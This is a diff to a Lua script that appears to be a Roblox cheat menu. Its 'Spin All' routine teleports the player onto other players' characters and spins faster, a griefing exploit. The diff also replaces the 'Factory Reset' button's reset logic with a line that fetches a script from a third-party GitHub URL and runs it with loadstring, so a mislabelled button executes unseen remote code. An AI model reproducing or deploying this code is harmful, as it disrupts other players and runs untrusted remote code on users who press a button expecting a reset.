@@ -466,7 +466,7 @@ InfiniteYieldButton.Parent = NovaMoreFrame
 
 -- 💫 Кнопка SPIN ALL
 local SpinAllButton = Instance.new("TextButton")
-SpinAllButton.Text = "🌀 Spin All"
+SpinAllButton.Text = "SPIN ALL"
 SpinAllButton.Size = UDim2.new(0, 200, 0, 35)
 SpinAllButton.Position = UDim2.new(0.5, -100, 0, 95)
 SpinAllButton.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
@@ -506,7 +506,7 @@ SpinAllButton.MouseButton1Click:Connect(function()
 					local hrp = plr.Character.HumanoidRootPart
 					for i = 1, 120 do
 						if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-							LocalPlayer.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(i * 30), 0)
+							LocalPlayer.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(i * 300), 0)
 							task.wait(0.05)
 						end
 					end
@@ -517,14 +517,8 @@ SpinAllButton.MouseButton1Click:Connect(function()
 end)
 
 FactoryResetButton.MouseButton1Click:Connect(function()
-	for _, file in ipairs({"NovaMoreButton_pos.json"}) do
-		if isfile and isfile(file) then delfile(file) end
-	end
-	NovaMoreFrame.Visible = false
-	NovaMoreButton.Position = UDim2.new(0.5, -60, 0.5, 60)
-	saveButtonPosition(NovaMoreButton)
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
 end)
-
 
 -- === SYSTEM INTEGRITY WATCHDOG ===
 task.spawn(function()
